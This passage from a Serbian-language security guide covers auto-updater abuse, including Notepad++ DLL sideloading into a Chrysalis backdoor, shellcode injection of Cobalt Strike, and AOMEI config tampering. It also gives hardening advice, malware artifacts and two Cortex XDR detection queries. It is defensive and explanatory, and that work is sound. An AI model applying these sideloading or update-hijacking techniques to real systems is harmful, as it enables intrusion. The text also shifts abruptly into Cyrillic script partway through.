   - **Upotreba sopstvenog potpisanog binarnog fajla + sideload**: uključite potpisani Bitdefender `BluetoothService.exe` i postavite zlonamerni `log.dll` u njegovu putanju pretrage. Kada se potpisani binarni fajl pokrene, Windows učitava `log.dll` putem sideload-a; ona dešifruje i reflektivno učitava Chrysalis backdoor (zaštićen Warbird-om + API hashing radi otežavanja statičke detekcije).
   - **Ubrizgavanje shellcode-a skriptom**: NSIS izvršava kompajliranu Lua skriptu koja koristi Win32 API-je (npr. `EnumWindowStationsW`) za ubrizgavanje shellcode-a i postavljanje Cobalt Strike Beacon-a.<sup>[[12]](#references)</sup>

Preporuke za hardening/detekciju za sve auto-updatere:
- Zahtevajte **proveru sertifikata i potpisa** preuzetog instalera (zakačite potpisnika dobavljača, odbacite nepodudarni CN/lanac) i potpišite sam update manifest (npr. XMLDSig). Blokirajte preusmeravanja koja kontroliše manifest, osim ako nisu validirana.
- Tretirajte **sideload potpisanog binarnog fajla koji ste sami obezbedili** kao tačku za detekciju nakon preuzimanja: upozorite kada potpisani EXE dobavljača učita DLL sa imenom izvan kanonske putanje instalacije (npr. Bitdefender učita `log.dll` iz Temp/Downloads) i kada updater postavi/izvrši installere iz temp локације са потписима који нису од добављача.
- Надгледајте **артефакте специфичне за malware** уочене у овом ланцу (корисне као опште тачке претраге): mutex `Global\Jdhfv_1.0.1`, необична уписивања `gup.exe` у `%TEMP%` и фазе убризгавања shellcode-а покренуте Lua скриптом.
- Notepad++ је ојачао WinGUp у верзији v8.8.9 и новијим: враћени XML је сада потписан (XMLDSig), а новије верзије захтевају проверу сертификата и потписа преузетог инсталера уместо да се ослањају само на транспорт.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload потписаног Bitdefender EXE-а за <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalater koji nije Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ovi obrasci mogu se primeniti na svaki updater koji prihvata nepotpisane manifest-e ili ne proverava potpisnike instalera — otmica mreže + zlonamerni installer + BYO-signed sideloading omogućavaju remote code execution pod izgovorom „pouzdanih” ažuriranja.

### Konfiguracija obaveštenja kao drugi okidač ažuriranja

Updater može da koristi odvojene udaljene konfiguracije za **pripremu sadržaja i pokretanje njegovog izvršavanja**. Za to je potrebna kontrola nad konfiguracijama ili njihovim odgovorima; izveštaji ne navode kako je dobijen pristup izvoru. U slučaju AOMEI-ja, `down_html.ini` je određivao URL arhive, verziju (`thrid`) i MD5 (`Val`); napadač je povećao verziju i promenio URL i odgovarajući checksum. Ovo je gore opisani [propust na granici poverenja u metapodatke](#2-hijacking-the-update-channel-to-run-code-as-system). Dodatni put izvršavanja nalazio se u `Notifycfg.ini`: upućivao je `ABNotify.exe` da učita izdvojeni `upgrade-now.html` preko lokalnog URL-a `file:///` u WebView-u. Stranica je automatski preusmeravala na izvršnu datoteku u istom direktorijumu, koju je WebView prosleđivao sistemskoj ljusci. Podređeni proces je nasledio privilegije procesa notifier; to samo po sebi nije podiglo privilegije na SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google je prijavio i izmenjeni `Notifycfg.ini` sa više od 35.000 ponovljenih lažnih sekcija, koje su zaobišle uobičajenu proveru verzije ovog klijenta. Izveštaj ne dokazuje postojanje opšteg zaobilaženja parsera. Napadač je vraćao udaljene datoteke u prvobitno stanje posle perioda od pet do deset minuta, pa su izmenjenu konfiguraciju dobijali samo klijenti koji su je proveravali tokom tih perioda. Ovaj kanal za obaveštenja prenosio je i zaseban [mamac za WebDAV/NTLM coercion](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), za koji nije bilo potrebno izvršavanje arhive.<sup>[[18]](#references)</sup>

---
## References
- [1] [Bezbednosno obaveštenje – Netskope Client za Windows – lokalno podizanje privilegija preko lažnog servera (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Bezbednosno obaveštenje Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope dodatak](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC klijent/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre i Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Lokalno podizanje privilegija preko datoteka sa pravom upisa u Checkmk Agent-u](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Podizanje privilegija u Windows agentu](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC-ovi](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Akteri koje podržavaju države iskorišćavaju lanac snabdevanja Notepad++-a](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ažuriranje informacija o incidentu sa otetom infrastrukturom](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Zaobilaženje ispravke za CVE-2025-0309 u Netskope Client-u za Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Otkrivanje ranjivosti za podizanje privilegija u Lenovo Vantage-u](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: od gRPC-a do SYSTEM-a](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Kompromitovanje lanca snabdevanja AOMEI Backupper-a](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group i Mandiant – Istraga o prolaznom neovlašćenom menjanju lanca snabdevanja](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
